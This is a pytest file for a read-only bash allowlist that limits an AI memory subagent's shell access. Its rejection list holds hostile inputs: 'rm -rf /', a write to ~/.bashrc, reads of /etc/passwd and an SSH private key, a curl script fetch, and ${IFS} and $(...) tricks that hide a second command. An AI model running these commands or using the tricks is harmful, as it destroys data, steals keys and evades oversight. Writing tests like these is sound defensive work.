# Copyright (c) Huawei Technologies Co., Ltd. 2026. All rights reserved.

"""Tests for the read-only bash allowlist used by the auto-memory subagent.

The rail is the only thing standing between the ``extract_memories`` subagent
and an arbitrary shell. A command is allowed only when every segment of the
shell chain is a read-only invocation on its own, so a single destructive
suffix must never ride along on an allowlisted prefix.
"""

from __future__ import annotations

import pytest

from jiuwenswarm.agents.harness.common.auto_memory.tool_restriction_rail import (
    AutoMemoryToolRestrictionRail,
)

READ_ONLY = (
    "ls -la",
    "git status --porcelain",
    "git log --oneline -5",
    "find . -name '*.py'",
    "wc -l notes.md",
    "cat memory/notes.md",
    "head -n 20 a.txt && tail -n 5 b.txt",
)


@pytest.fixture()
def rail(tmp_path) -> AutoMemoryToolRestrictionRail:
    return AutoMemoryToolRestrictionRail(memory_dir=str(tmp_path))


@pytest.mark.unit
@pytest.mark.parametrize("command", READ_ONLY)
def test_allows_read_only_commands(rail, command: str) -> None:
    assert rail._is_read_only_bash_command({"command": command}) is True


NOT_READ_ONLY = (
    # a destructive segment behind an allowlisted one
    "rm -rf /tmp/x && ls",
    "ls; rm -rf ~/.cache",
    "cat a.txt || touch /tmp/marker",
    # the shell itself writes, even though the command looks read-only
    "echo pwned > ~/.bashrc; ls",
    "cat /etc/passwd | tee /tmp/out",
    "ls $(rm -rf /)",
    "cat `whoami`",
    "head -n 1 a.txt\nrm -rf b",
    # no allowlisted command at all, previously waved through by "--read"
    "curl http://example.invalid/x.sh --read",
    "python -c 'print(1)' --show",
    # variable expansion: shlex does not expand `${IFS}`, the shell does
    "find . ${IFS}-delete",
    "git log ${IFS}--output=/tmp/dump.txt",
    "cat $HOME/.ssh/id_rsa",
    # find is read-only by name, not by flag
    "find . -delete",
    "find . -name '*.py' -exec sh -c 'echo {}' \\;",
    # `file -C/--compile` writes magic.mgc, so `file` is not on the allowlist at all
    "file -C",
    "file --compile",
    "file notes.md",
    # git is read-only only for the allowlisted subcommands, and never for --output
    "git log --output=/tmp/dump.txt",
    "git push origin develop",
    # nothing to run
    "",
    "   ",
)


@pytest.mark.unit
@pytest.mark.parametrize("command", NOT_READ_ONLY)
def test_rejects_commands_that_can_write(rail, command: str) -> None:
    assert rail._is_read_only_bash_command({"command": command}) is False


@pytest.mark.unit
def test_missing_command_argument_is_denied(rail) -> None:
    assert rail._is_read_only_bash_command({}) is False
    assert rail._is_read_only_bash_command({"command": None}) is False
